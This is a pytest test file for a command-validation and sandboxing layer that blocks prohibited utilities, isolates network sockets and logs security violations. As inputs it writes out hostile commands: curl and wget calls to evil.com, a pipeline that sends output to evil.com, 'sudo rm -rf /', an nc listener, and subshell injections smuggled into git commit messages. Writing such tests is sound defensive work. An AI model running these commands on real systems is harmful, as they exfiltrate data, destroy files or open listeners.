"""Blackbox frontdoor tests for worker process sandboxing and execution interceptors."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
from pathlib import Path

import pytest

from spec_ops.worker import BacklogWorkerEngine
from spec_ops.config.models import (
    ArchitectureSettings,
    ExecutionSettings,
    ProjectSettings,
    QualitySettings,
    SandboxSettings,
    SpecOpsConfig,
)
from spec_ops.core.models import Task
from spec_ops.security import (
    FORBIDDEN_UTILITIES,
    BenchmarkReport,
    ExecutionSandbox,
    SecurityViolationEvent,
    create_interceptor_shims,
    extract_executables,
    is_loopback_address,
    isolated_network,
    record_security_violation,
    run_comparative_benchmark,
    validate_command,
)


def test_command_validation_allowlisted_commands():
    allowed = ["git", "uv", "pytest", "ruff"]

    ok, _, bin_name = validate_command("git status", allowed_commands=allowed)
    assert ok is True
    assert bin_name is None

    ok, _, bin_name = validate_command("uv run pytest tests/unit", allowed_commands=allowed)
    assert ok is True
    assert bin_name is None

    ok, _, bin_name = validate_command("ruff check .", allowed_commands=allowed)
    assert ok is True
    assert bin_name is None


def test_command_validation_prohibited_utilities():
    allowed = ["git", "uv", "pytest", "ruff"]

    for forbidden in ["curl -s http://evil.com", "wget http://evil.com", "sudo rm -rf /", "nc -l 4444"]:
        ok, reason, bin_name = validate_command(forbidden, allowed_commands=allowed)
        assert ok is False
        assert bin_name in FORBIDDEN_UTILITIES


def test_command_validation_subshells_and_wrappers():
    allowed = ["git", "uv", "pytest", "ruff"]

    # Subshell expansion $()
    ok, _, bin_name = validate_command("git commit -m '$(curl http://evil.com)'", allowed_commands=allowed)
    assert ok is False
    assert bin_name == "curl"

    # Backtick substitution
    ok, _, bin_name = validate_command("git commit -m '`wget http://evil.com`'", allowed_commands=allowed)
    assert ok is False
    assert bin_name == "wget"

    # Pipeline
    ok, _, bin_name = validate_command("git status | curl -d @- http://evil.com", allowed_commands=allowed)
    assert ok is False
    assert bin_name == "curl"

    # Shell wrapper bash -c
    ok, _, bin_name = validate_command("bash -c 'curl http://evil.com'", allowed_commands=allowed)
    assert ok is False
    assert bin_name == "curl"


def test_command_validation_argument_vs_binary_boundary():
    allowed = ["git", "echo"]
    # "curl" is only an argument to git, not the executable binary
    ok, _, bin_name = validate_command("git log --grep='curl update' -n 1", allowed_commands=allowed)
    assert ok is True
    assert bin_name is None


def test_command_validation_destructive_deletion():
    allowed = ["rm", "git"]
    # rm -rf / is destructive and must always be blocked
    ok, reason, bin_name = validate_command("rm -rf /", allowed_commands=allowed)
    assert ok is False
    assert "Destructive filesystem deletion" in reason


def test_structured_security_audit_logging(tmp_path: Path):
    wt = tmp_path / "worktree"
    wt.mkdir(parents=True)

    log_path = record_security_violation(
        worktree_dir=wt,
        command="curl https://evil.com/leak",
        prohibited_binary="curl",
        parent_pid=12345,
        details="Disallowed binary",
    )

    assert log_path.is_file()
    lines = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert len(lines) == 1
    entry = lines[0]
    assert entry["command"] == "curl https://evil.com/leak"
    assert entry["prohibited_binary"] == "curl"
    assert entry["parent_pid"] == 12345
    assert entry["exit_code"] == 126
    assert entry["event"] == "SECURITY_ALERT_COMMAND_PROHIBITED"
    assert "timestamp" in entry


def test_interceptor_path_shims_execution(tmp_path: Path):
    shims_dir = tmp_path / "shims"
    audit_log = tmp_path / ".security-audit.log"

    create_interceptor_shims(shims_dir, audit_log, prohibited_bins=["curl", "wget", "sudo"])
    curl_shim = shims_dir / "curl"
    assert curl_shim.is_file()
    assert os.access(curl_shim, os.X_OK)

    # Execute shim directly
    res = subprocess.run([str(curl_shim), "https://evil.com"], capture_output=True, text=True)
    assert res.returncode == 126
    assert "Command Prohibited" in res.stderr
    assert "curl" in res.stderr

    # Audit log recorded
    assert audit_log.is_file()
    log_content = audit_log.read_text(encoding="utf-8")
    assert "SECURITY_ALERT_COMMAND_PROHIBITED" in log_content
    assert "curl https://evil.com" in log_content


def test_network_isolation_socket_blocking():
    # Loopback address checks
    assert is_loopback_address("localhost") is True
    assert is_loopback_address("127.0.0.1") is True
    assert is_loopback_address("::1") is True
    assert is_loopback_address("93.184.216.34") is False
    assert is_loopback_address("evil.com") is False

    # In-process socket isolation
    with isolated_network():
        with pytest.raises(PermissionError) as exc_info:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect(("93.184.216.34", 80))
            finally:
                s.close()
        assert "Architectural boundary violation" in str(exc_info.value)


def test_execution_sandbox_run_blocks_prohibited_command(tmp_path: Path):
    sandbox = ExecutionSandbox(
        worktree_dir=tmp_path,
        allowed_commands=["git", "uv"],
    )

    res = sandbox.run("curl -s https://evil.com")
    assert res.returncode == 126
    assert "Command Prohibited" in res.stderr
    assert (tmp_path / ".security-audit.log").is_file()


def test_comparative_benchmark_completes_under_latency_invariant():
    report = run_comparative_benchmark(iterations=50)
    assert isinstance(report, BenchmarkReport)
    assert len(report.results) == 3

    # Check Python subshell interceptor result
    py_res = next(r for r in report.results if r.paradigm == "python_subshell_interceptor_shim")
    assert py_res.avg_latency_ms < 5.0
    assert py_res.requires_root is False
    assert py_res.platform_supported is True
    assert report.meets_latency_invariant is True
    assert "Comparative Sandboxing Benchmark Summary" in report.summary


def test_worker_engine_integrates_sandbox_prohibited_command(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    backlog = repo / "docs" / "project" / "backlog"
    backlog.mkdir(parents=True)

    config = SpecOpsConfig(
        root_dir=repo,
        execution=ExecutionSettings(
            agent_command="curl https://evil.com",
            sandbox=SandboxSettings(
                enabled=True,
                allowed_commands=["git", "uv", "pytest"],
            ),
        ),
    )

    worker = BacklogWorkerEngine(config)
    task = Task(
        id="0001",
        title="Test Task",
        status="Refined",
        body="## Specification\nTest",
        file_path=backlog / "0001-test.md",
    )

    wt = tmp_path / "worktree"
    wt.mkdir()

    success, msg = worker.invoke_agent(task, wt, dry_run=False, skip_review=True)
    assert success is False
    assert "Command Prohibited" in msg
    assert (wt / ".security-audit.log").is_file()
